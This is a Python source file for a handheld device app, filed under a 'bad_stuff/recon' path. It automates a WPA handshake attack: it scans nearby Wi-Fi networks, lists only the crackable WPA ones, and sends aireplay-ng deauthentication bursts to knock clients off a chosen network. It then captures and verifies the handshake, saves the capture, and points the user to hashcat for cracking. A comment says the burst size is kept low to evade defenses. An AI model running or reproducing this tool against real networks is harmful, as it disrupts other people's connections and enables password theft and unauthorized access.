"""
apps/bad_stuff/recon/handshake/app.py
WPA Handshake Capture — scan networks, select target, capture handshake.

Requires:
  - Wi-Fi adapter supporting monitor mode on wlan1 (auto-detected)
  - aircrack-ng suite (airodump-ng, aireplay-ng, aircrack-ng)

Saves .cap files to: menu_fs/02_files/handshakes/

States:
  IDLE     — waiting to start, shows adapter status
  SCANNING — airodump-ng scanning all networks
  SELECT   — user picks target from list
  CAPTURE  — airodump-ng focused on target BSSID
  DONE     — handshake captured or timed out

Controls:
  IDLE:    CTR:scan  K3:exit
  SCAN:    (auto → SELECT after SCAN_DURATION seconds)
  SELECT:  UP/DN:scroll  CTR:select target  K3:back
  CAPTURE: KEY1:deauth  K3:abort
  DONE:    CTR:new scan  K3:exit
"""

import os
import re
import time
import shutil
import logging
import tempfile
import threading
import subprocess
import datetime
from PIL import Image, ImageDraw

TOP_H = 26
BOT_H = 18

BG     = (4,   8,   16)
HDR_BG = (8,   14,  28)
SEP    = (25,  45,  75)
SEP_HI = (50,  90,  140)
WHITE  = (220, 235, 255)
DIM    = (70,  100, 140)
HINT   = (50,  75,  110)
CYAN   = (0,   210, 255)
GREEN  = (50,  220, 120)
YELLOW = (255, 200, 50)
RED    = (255, 70,  70)
ORANGE = (255, 140, 30)
PURPLE = (160, 80,  255)

log = logging.getLogger("handshake")

BASE_DIR = os.path.dirname(
    os.path.dirname(
        os.path.dirname(
            os.path.dirname(
                os.path.dirname(os.path.abspath(__file__))
            )
        )
    )
)

OUTPUT_DIR      = os.path.join(BASE_DIR, "menu_fs", "02_files", "handshakes")
PREFERRED_IFACE = "wlan1"   # first choice, auto-detected below

SCAN_DURATION   = 15   # seconds for initial scan
DEAUTH_COUNT    = 3    # deauth packets per burst (keep low)
CAPTURE_TIMEOUT = 120  # seconds before giving up

# Valid Wi-Fi channel ranges
VALID_CHANNELS_24 = set(range(1, 15))
VALID_CHANNELS_5  = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
}

STATE_IDLE     = "idle"
STATE_SCANNING = "scanning"
STATE_SELECT   = "select"
STATE_CAPTURE  = "capture"
STATE_DONE     = "done"


# ── Helpers ───────────────────────────────────────────────────

def _ts(draw, text, font):
    b = draw.textbbox((0, 0), text, font=font)
    return b[2] - b[0], b[3] - b[1]


def _trunc(draw, text, font, max_w):
    while text:
        w, _ = _ts(draw, text, font)
        if w <= max_w:
            return text
        text = text[:-2] + "…"
    return ""


def _iface_exists(iface: str) -> bool:
    return os.path.exists(f"/sys/class/net/{iface}")


def _is_monitor(iface: str) -> bool:
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, timeout=5)
        return "type monitor" in r.stdout.decode()
    except Exception as e:
        log.warning("_is_monitor(%s) failed: %s", iface, e)
        return False


def _detect_monitor_iface() -> str | None:
    """
    Find a suitable monitor-capable interface.
    Prefers wlan1, falls back to any wlanX that supports monitor mode.
    """
    # Try preferred first
    if _iface_exists(PREFERRED_IFACE):
        return PREFERRED_IFACE

    # Scan all wlan interfaces
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, timeout=5)
        for line in result.stdout.decode().splitlines():
            m = re.search(r"Interface (wlan\d+)", line)
            if m and m.group(1) != "wlan0":
                return m.group(1)
    except Exception as e:
        log.warning("_detect_monitor_iface failed: %s", e)
    return None


def _enable_monitor(iface: str) -> bool:
    """Enable monitor mode. Returns True on success."""
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       timeout=5, capture_output=True)
        subprocess.run(["sudo", "iw", iface, "set", "monitor", "control"],
                       timeout=5, capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       timeout=5, capture_output=True)
        ok = _is_monitor(iface)
        if not ok:
            log.warning("Monitor mode failed for %s", iface)
        return ok
    except Exception as e:
        log.warning("_enable_monitor(%s) failed: %s", iface, e)
        return False


def _validate_channel(channel_str: str) -> str | None:
    """
    Validate and clean channel string.
    Returns clean channel string or None if invalid.
    """
    try:
        ch = int(channel_str.strip().lstrip("-"))
        if ch in VALID_CHANNELS_24 or ch in VALID_CHANNELS_5:
            return str(ch)
        log.warning("Channel %d out of valid range", ch)
        return None
    except (ValueError, AttributeError) as e:
        log.warning("Invalid channel value '%s': %s", channel_str, e)
        return None


def _kill_proc(proc, name: str = "process"):
    """
    Gracefully terminate a subprocess.
    First sends SIGTERM, waits 3s, then SIGKILL if still running.
    """
    if proc is None:
        return
    try:
        # Try graceful terminate first
        subprocess.run(["sudo", "kill", "-TERM", str(proc.pid)],
                       capture_output=True, timeout=3)
        try:
            proc.wait(timeout=3)
            log.debug("%s terminated gracefully", name)
            return
        except subprocess.TimeoutExpired:
            pass

        # Force kill if still running
        subprocess.run(["sudo", "kill", "-KILL", str(proc.pid)],
                       capture_output=True, timeout=3)
        proc.wait(timeout=3)
        log.debug("%s force-killed", name)
    except Exception as e:
        log.warning("Failed to kill %s (pid=%s): %s", name, proc.pid, e)


def _parse_airodump_csv(csv_path: str) -> list:
    """
    Parse airodump-ng CSV output.
    Returns list of validated AP dicts sorted by signal strength.
    """
    networks = []
    if not os.path.exists(csv_path):
        log.warning("CSV not found: %s", csv_path)
        return networks

    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # AP section is before the first blank line
        ap_block = content.split("\n\n")[0]
        lines    = ap_block.strip().splitlines()

        # Build station section lookup for client count
        station_lookup: dict[str, int] = {}
        if "\n\n" in content:
            station_block = content.split("\n\n", 1)[1]
            for sline in station_block.splitlines():
                # Station CSV: Station MAC, ..., BSSID, ...
                sparts = [p.strip() for p in sline.split(",")]
                if len(sparts) >= 6:
                    ap_bssid = sparts[5].strip().upper()
                    if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", ap_bssid):
                        station_lookup[ap_bssid] = (
                            station_lookup.get(ap_bssid, 0) + 1
                        )

        for line in lines[1:]:  # skip header
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 14:
                continue

            bssid = parts[0].strip().upper()
            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                continue

            # Validate channel — skip if invalid
            channel = _validate_channel(parts[3])
            if channel is None:
                continue

            try:
                signal = int(parts[8].strip())
            except (ValueError, IndexError):
                signal = -100

            privacy = parts[5].strip()
            ssid    = parts[13].strip() if len(parts) > 13 else ""
            if not ssid:
                ssid = "<hidden>"

            if "WPA3" in privacy:
                enc = "WPA3"
            elif "WPA2" in privacy:
                enc = "WPA2"
            elif "WPA" in privacy:
                enc = "WPA"
            else:
                enc = "OPEN"

            networks.append({
                "bssid":   bssid,
                "ssid":    ssid,
                "channel": channel,
                "signal":  signal,
                "enc":     enc,
                "clients": station_lookup.get(bssid, 0),
            })

        # Sort by signal strength (strongest first)
        networks.sort(key=lambda n: n["signal"], reverse=True)
        log.debug("Parsed %d networks from CSV", len(networks))

    except Exception as e:
        log.error("CSV parse error: %s", e)

    return networks


def _check_handshake(cap_file: str, bssid: str) -> bool:
    """
    Verify .cap file contains a valid WPA handshake using aircrack-ng.
    Avoids false positives from substring matching.
    """
    try:
        r = subprocess.run(
            ["aircrack-ng", "-a", "2", "-b", bssid, cap_file],
            capture_output=True, timeout=20
        )
        out = r.stdout.decode("utf-8", errors="ignore")
        log.debug("aircrack-ng output: %s", out[:200])

        # Look for specific success pattern: "X handshake" where X > 0
        m = re.search(r"(\d+)\s+handshake", out, re.IGNORECASE)
        if m and int(m.group(1)) > 0:
            return True

        # Also check for "KEY FOUND" pattern in case wordlist somehow works
        if "KEY FOUND" in out:
            return True

        return False
    except Exception as e:
        log.warning("_check_handshake failed: %s", e)
        return False


# ── App ───────────────────────────────────────────────────────

class HandshakeApp:
    def __init__(self, hw, fonts, monitor=None):
        self.hw = hw
        self.font_big, self.font_small, self.font_label = fonts

        self.state  = STATE_IDLE
        self._dirty = True

        # Adapter
        self._iface       = None
        self._adapter_ok  = False
        self._adapter_msg = "Checking adapter..."

        # Scan state
        self._networks    = []
        self._sel_idx     = 0
        self._scroll      = 0
        self._scan_proc   = None
        self._scan_tmpdir = None
        self._scan_start  = 0   # separate timer for scan UI

        # Capture state
        self._target      = None
        self._cap_proc    = None
        self._cap_tmpdir  = None
        self._cap_start   = 0
        self._handshake   = False
        self._deauth_busy = False
        self._status_msg  = ""
        self._saved_path  = ""

        self._last_redraw = 0

    def on_enter(self):
        self.state  = STATE_IDLE
        self._dirty = True
        threading.Thread(target=self._check_adapter, daemon=True).start()

    def on_exit(self):
        self._kill_scan()
        self._kill_capture()

    def _check_adapter(self):
        iface = _detect_monitor_iface()
        if iface is None:
            self._adapter_ok  = False
            self._adapter_msg = "No adapter found on wlan1+"
            log.warning("No monitor-capable adapter detected")
        elif not _is_monitor(iface):
            ok = _enable_monitor(iface)
            if ok:
                self._iface       = iface
                self._adapter_ok  = True
                self._adapter_msg = f"{iface} ready"
            else:
                self._adapter_ok  = False
                self._adapter_msg = f"{iface}: monitor failed"
        else:
            self._iface       = iface
            self._adapter_ok  = True
            self._adapter_msg = f"{iface} ready"
        self._dirty = True

    # ── Scan ──────────────────────────────────────────────────

    def _start_scan(self):
        if not self._adapter_ok or not self._iface:
            log.warning("Scan attempted without ready adapter")
            return

        self._networks   = []
        self._scan_start = time.time()
        self._scan_tmpdir = tempfile.mkdtemp()
        outbase = os.path.join(self._scan_tmpdir, "scan")
        self.state    = STATE_SCANNING
        self._dirty   = True

        def _run():
            proc = None
            try:
                # Kill interfering processes before scan
                subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                               capture_output=True, timeout=10)
                log.debug("airmon-ng check kill done")
                proc = subprocess.Popen(
                    [
                        "sudo", "airodump-ng",
                        "--band", "abg",
                        "--output-format", "csv",
                        "--write", outbase,
                        "--write-interval", "2",
                        self._iface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._scan_proc = proc
                time.sleep(SCAN_DURATION)
            except Exception as e:
                log.error("airodump-ng scan failed: %s", e)
            finally:
                _kill_proc(proc, "airodump-ng scan")
                self._scan_proc = None

                # Parse CSV before cleanup
                csv_path = outbase + "-01.csv"
                nets = _parse_airodump_csv(csv_path)

                # Cleanup temp dir
                if self._scan_tmpdir:
                    shutil.rmtree(self._scan_tmpdir, ignore_errors=True)
                    self._scan_tmpdir = None

                # Filter to WPA only — OPEN can't be cracked
                self._networks = [
                    n for n in nets if n["enc"] in ("WPA", "WPA2", "WPA3")
                ]
                log.info("Scan complete: %d WPA networks", len(self._networks))
                self._sel_idx = 0
                self._scroll  = 0
                self.state    = STATE_SELECT
                self._dirty   = True

        threading.Thread(target=_run, daemon=True).start()

    def _kill_scan(self):
        if self._scan_proc:
            _kill_proc(self._scan_proc, "airodump-ng scan")
            self._scan_proc = None
        if self._scan_tmpdir:
            shutil.rmtree(self._scan_tmpdir, ignore_errors=True)
            self._scan_tmpdir = None

    # ── Capture ───────────────────────────────────────────────

    def _start_capture(self, network: dict):
        # Validate channel before starting
        channel = _validate_channel(network.get("channel", ""))
        if channel is None:
            self._status_msg = f"Invalid channel: {network.get('channel')}"
            log.error("Capture aborted: invalid channel '%s'", network.get("channel"))
            self._dirty = True
            return

        bssid = network["bssid"]
        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
            self._status_msg = "Invalid BSSID"
            log.error("Capture aborted: invalid BSSID '%s'", bssid)
            self._dirty = True
            return

        self._target     = {**network, "channel": channel}
        self._handshake  = False
        self._saved_path = ""
        self._status_msg = "Waiting for handshake..."
        self._cap_start  = time.time()

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        ssid_safe = re.sub(r"[^a-zA-Z0-9_-]", "_", network["ssid"])[:20]
        self._cap_tmpdir = tempfile.mkdtemp()
        cap_base  = os.path.join(self._cap_tmpdir, f"hs_{ssid_safe}_{ts}")

        log.info("Starting capture: BSSID=%s CH=%s", bssid, channel)

        def _run():
            proc = None
            try:
                proc = subprocess.Popen(
                    [
                        "sudo", "airodump-ng",
                        "--bssid", bssid,
                        "--channel", channel,
                        # Use pcap format — more compatible than cap
                        "--output-format", "pcap",
                        "--write", cap_base,
                        self._iface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._cap_proc = proc
                cap_file = cap_base + "-01.cap"

                # Wait up to 15s for airodump to create the file
                for _ in range(30):
                    if os.path.exists(cap_file):
                        break
                    time.sleep(0.5)
                else:
                    log.error("Cap file never created: %s", cap_file)

                # Poll until handshake or timeout
                while proc.poll() is None:
                    elapsed = time.time() - self._cap_start
                    if elapsed > CAPTURE_TIMEOUT:
                        self._status_msg = "Timeout — no handshake"
                        log.info("Capture timeout after %ds", int(elapsed))
                        break

                    if os.path.exists(cap_file):
                        if _check_handshake(cap_file, bssid):
                            self._handshake  = True
                            self._status_msg = "Handshake captured!"
                            log.info("Handshake confirmed for %s", bssid)
                            break

                    self._status_msg = f"Capturing... {int(elapsed)}s"
                    self._dirty = True
                    time.sleep(2)

            except Exception as e:
                log.error("Capture thread error: %s", e)
                self._status_msg = f"Error: {e}"
            finally:
                _kill_proc(proc, "airodump-ng capture")
                self._cap_proc = None

                # Save .cap file
                cap_file = cap_base + "-01.cap"
                if os.path.exists(cap_file):
                    suffix = "" if self._handshake else "_noconfirm"
                    final_name = f"hs_{ssid_safe}_{ts}{suffix}.cap"
                    final_path = os.path.join(OUTPUT_DIR, final_name)
                    try:
                        shutil.copy2(cap_file, final_path)
                        self._saved_path = final_path
                        log.info("Saved: %s", final_path)
                    except Exception as e:
                        log.error("Failed to save cap: %s", e)
                else:
                    log.warning("No .cap file found at: %s", cap_file)

                if self._cap_tmpdir:
                    shutil.rmtree(self._cap_tmpdir, ignore_errors=True)
                    self._cap_tmpdir = None

                # Restart network services after capture
                try:
                    subprocess.run(
                        ["sudo", "systemctl", "restart", "NetworkManager"],
                        capture_output=True, timeout=10
                    )
                    log.info("NetworkManager restarted")
                except Exception as e:
                    log.warning("Failed to restart NetworkManager: %s", e)

                self.state  = STATE_DONE
                self._dirty = True

        threading.Thread(target=_run, daemon=True).start()
        self.state  = STATE_CAPTURE
        self._dirty = True

    def _kill_capture(self):
        if self._cap_proc:
            _kill_proc(self._cap_proc, "airodump-ng capture")
            self._cap_proc = None
        if self._cap_tmpdir:
            shutil.rmtree(self._cap_tmpdir, ignore_errors=True)
            self._cap_tmpdir = None

    def _do_deauth(self):
        """
        Send a single targeted deauth burst to AP.
        Kept small (DEAUTH_COUNT=3) to avoid channel-hopping defense.
        """
        if self._deauth_busy or not self._target or not self._iface:
            return
        self._deauth_busy = True
        self._status_msg  = "Sending deauth..."
        self._dirty       = True

        bssid   = self._target["bssid"]
        channel = self._target["channel"]

        def _run():
            try:
                # Lock channel before deauth
                subprocess.run(
                    ["sudo", "iw", self._iface, "set", "channel", channel],
                    capture_output=True, timeout=5
                )
                r = subprocess.run(
                    [
                        "sudo", "aireplay-ng",
                        "--deauth", str(DEAUTH_COUNT),
                        "-a", bssid,
                        self._iface,
                    ],
                    capture_output=True, timeout=15,
                )
                log.debug("aireplay-ng stdout: %s",
                          r.stdout.decode(errors="ignore")[:100])
            except Exception as e:
                log.warning("Deauth failed: %s", e)
            finally:
                self._deauth_busy = False
                self._status_msg  = "Deauth sent — waiting..."
                self._dirty       = True

        threading.Thread(target=_run, daemon=True).start()

    # ── Events ────────────────────────────────────────────────

    def on_event(self, event) -> str:
        if self.state == STATE_IDLE:
            if event == "KEY3":
                return "exit"
            elif event == "CENTER" and self._adapter_ok:
                self._start_scan()

        elif self.state == STATE_SCANNING:
            pass  # Auto-transitions to SELECT

        elif self.state == STATE_SELECT:
            max_rows = (self.hw.H - TOP_H - BOT_H) // 28
            if event == "KEY3":
                self.state  = STATE_IDLE
                self._dirty = True
            elif event == "UP" and self._sel_idx > 0:
                self._sel_idx -= 1
                if self._sel_idx < self._scroll:
                    self._scroll = self._sel_idx
                self._dirty = True
            elif event == "DOWN" and self._sel_idx < len(self._networks) - 1:
                self._sel_idx += 1
                if self._sel_idx >= self._scroll + max_rows:
                    self._scroll = self._sel_idx - max_rows + 1
                self._dirty = True
            elif event == "CENTER":
                if self._networks:
                    self._start_capture(self._networks[self._sel_idx])
                else:
                    self._start_scan()

        elif self.state == STATE_CAPTURE:
            if event == "KEY1" and not self._deauth_busy:
                threading.Thread(target=self._do_deauth, daemon=True).start()
            elif event == "KEY3":
                self._kill_capture()
                self.state  = STATE_IDLE
                self._dirty = True

        elif self.state == STATE_DONE:
            if event == "KEY3":
                return "exit"
            elif event == "CENTER":
                self._start_scan()

        return "stay"

    def update(self, dt):
        # Redraw capture and scanning screens periodically
        if self.state in (STATE_CAPTURE, STATE_SCANNING):
            now = time.time()
            if now - self._last_redraw >= 1.5:
                self._last_redraw = now
                self._dirty = True

    # ── Draw ──────────────────────────────────────────────────

    def draw(self):
        if not self._dirty:
            return
        self._dirty = False

        W, H = self.hw.W, self.hw.H
        img  = Image.new("RGB", (W, H), BG)
        d    = ImageDraw.Draw(img)

        # Header
        d.rectangle([(0, 0), (W, TOP_H)], fill=HDR_BG)
        d.rectangle([(0, 0), (3, TOP_H)], fill=RED)
        d.text((10, (TOP_H - self.font_label.size) // 2),
               "HANDSHAKE", font=self.font_label, fill=RED)

        state_labels = {
            STATE_IDLE:     ("IDLE",    DIM),
            STATE_SCANNING: ("SCAN",    YELLOW),
            STATE_SELECT:   ("SELECT",  CYAN),
            STATE_CAPTURE:  ("CAPTURE", ORANGE),
            STATE_DONE:     ("DONE",    GREEN),
        }
        label, col = state_labels.get(self.state, ("", DIM))
        lw, lh = _ts(d, label, self.font_label)
        d.text((W - lw - 6, (TOP_H - lh) // 2),
               label, font=self.font_label, fill=col)
        d.line([(0, TOP_H), (W, TOP_H)], fill=SEP_HI, width=1)

        if self.state == STATE_IDLE:
            self._draw_idle(d, W, H)
        elif self.state == STATE_SCANNING:
            self._draw_scanning(d, W, H)
        elif self.state == STATE_SELECT:
            self._draw_select(d, W, H)
        elif self.state == STATE_CAPTURE:
            self._draw_capture(d, W, H)
        elif self.state == STATE_DONE:
            self._draw_done(d, W, H)

        self.hw.show(img)

    def _hint(self, d, W, H, text):
        d.line([(0, H - BOT_H), (W, H - BOT_H)], fill=SEP, width=1)
        tw, th = _ts(d, text, self.font_label)
        d.text(((W - tw) // 2, H - th - 2),
               text, font=self.font_label, fill=HINT)

    def _draw_idle(self, d, W, H):
        cy = TOP_H + (H - TOP_H - BOT_H) // 2

        col = GREEN if self._adapter_ok else RED
        aw, ah = _ts(d, self._adapter_msg, self.font_label)
        d.text(((W - aw) // 2, cy - ah - 10),
               self._adapter_msg, font=self.font_label, fill=col)

        if self._adapter_ok:
            sub = "CTR to scan networks"
            sw, _ = _ts(d, sub, self.font_label)
            d.text(((W - sw) // 2, cy + 6),
                   sub, font=self.font_label, fill=DIM)

        self._hint(d, W, H,
                   "CTR:scan  K3:exit" if self._adapter_ok else "K3:exit")

    def _draw_scanning(self, d, W, H):
        elapsed   = int(time.time() - self._scan_start)
        remaining = max(0, SCAN_DURATION - elapsed)
        lines = [
            ("Scanning networks...", YELLOW),
            ("2.4GHz + 5GHz", DIM),
            (f"{remaining}s remaining", CYAN),
        ]
        cy = TOP_H + (H - TOP_H - BOT_H) // 2
        y  = cy - len(lines) * 14
        for text, col in lines:
            tw, th = _ts(d, text, self.font_label)
            d.text(((W - tw) // 2, y), text,
                   font=self.font_label, fill=col)
            y += th + 8
        self._hint(d, W, H, "Please wait...")

    def _draw_select(self, d, W, H):
        M        = 6
        y        = TOP_H + 4
        row_h    = 24
        max_rows = (H - TOP_H - BOT_H) // row_h

        if not self._networks:
            tw, _ = _ts(d, "No WPA networks found", self.font_label)
            d.text(((W - tw) // 2, TOP_H + 40),
                   "No WPA networks found", font=self.font_label, fill=DIM)
            self._hint(d, W, H, "CTR:rescan  K3:back")
            return

        visible = self._networks[self._scroll:self._scroll + max_rows]

        for i, net in enumerate(visible):
            real_idx = self._scroll + i
            selected = real_idx == self._sel_idx
            row_y    = y + i * row_h

            if selected:
                d.rectangle([(0, row_y - 1), (W, row_y + row_h - 2)],
                             fill=(20, 35, 60))
                d.rectangle([(0, row_y - 1), (3, row_y + row_h - 2)],
                             fill=CYAN)

            # Signal strength indicator
            sig     = net["signal"]
            sig_col = GREEN if sig > -60 else YELLOW if sig > -75 else RED
            sig_str = f"{sig}"
            sw, _   = _ts(d, sig_str, self.font_label)
            d.text((W - sw - M, row_y + (row_h - self.font_label.size) // 2),
                   sig_str, font=self.font_label, fill=sig_col)

            # SSID
            ssid_max = W - sw - M * 3 - 10
            ssid_str = _trunc(d, net["ssid"], self.font_label, ssid_max)
            d.text((M + 6, row_y + (row_h - self.font_label.size) // 2),
                   ssid_str, font=self.font_label,
                   fill=WHITE if selected else DIM)

        # Scrollbar
        if len(self._networks) > max_rows:
            sb_h = int((H - TOP_H - BOT_H) * max_rows / len(self._networks))
            sb_y = int(
                TOP_H + (H - TOP_H - BOT_H) * self._scroll / len(self._networks)
            )
            d.rectangle([(W - 3, TOP_H), (W, H - BOT_H)],
                         fill=(20, 35, 60))
            d.rectangle([(W - 3, sb_y), (W, sb_y + sb_h)], fill=CYAN)

        self._hint(d, W, H, "UP/DN:scroll  CTR:select  K3:back")

    def _draw_capture(self, d, W, H):
        M  = 8
        y  = TOP_H + 8
        lh = self.font_label.size + 6

        if not self._target:
            return

        ssid = _trunc(d, self._target["ssid"], self.font_label, W - M * 2)
        d.text((M, y), ssid, font=self.font_label, fill=WHITE)
        y += lh

        d.text((M, y), self._target["bssid"],
               font=self.font_label, fill=DIM)
        y += lh

        d.text((M, y),
               f"ch{self._target['channel']}  {self._target['enc']}",
               font=self.font_label, fill=DIM)
        y += lh + 4

        d.line([(M, y), (W - M, y)], fill=SEP, width=1)
        y += 8

        elapsed   = int(time.time() - self._cap_start)
        remaining = max(0, CAPTURE_TIMEOUT - elapsed)
        d.text((M, y), f"{elapsed}s  ({remaining}s left)",
               font=self.font_label, fill=DIM)
        y += lh

        status_col = GREEN if "captured" in self._status_msg else (
            RED if "Error" in self._status_msg or "Timeout" in self._status_msg
            else YELLOW
        )
        d.text((M, y),
               _trunc(d, self._status_msg, self.font_label, W - M * 2),
               font=self.font_label, fill=status_col)

        hint = "KEY1:deauth  K3:abort"
        if self._deauth_busy:
            hint = "Sending deauth...  K3:abort"
        self._hint(d, W, H, hint)

    def _draw_done(self, d, W, H):
        M  = 8
        cy = TOP_H + (H - TOP_H - BOT_H) // 2
        y  = cy - 40

        if self._handshake:
            result, result_col = "Handshake captured!", GREEN
        else:
            result, result_col = "Saved (unconfirmed)", YELLOW

        rw, rh = _ts(d, result, self.font_label)
        d.text(((W - rw) // 2, y), result,
               font=self.font_label, fill=result_col)
        y += rh + 8

        if self._saved_path:
            fname = os.path.basename(self._saved_path)
            name  = _trunc(d, fname, self.font_label, W - M * 2)
            nw, _ = _ts(d, name, self.font_label)
            d.text(((W - nw) // 2, y), name,
                   font=self.font_label, fill=CYAN)
            y += rh + 8

        sub = "Crack: hashcat -m 22000"
        sw, _ = _ts(d, sub, self.font_label)
        d.text(((W - sw) // 2, y), sub,
               font=self.font_label, fill=DIM)

        self._hint(d, W, H, "CTR:new scan  K3:exit")
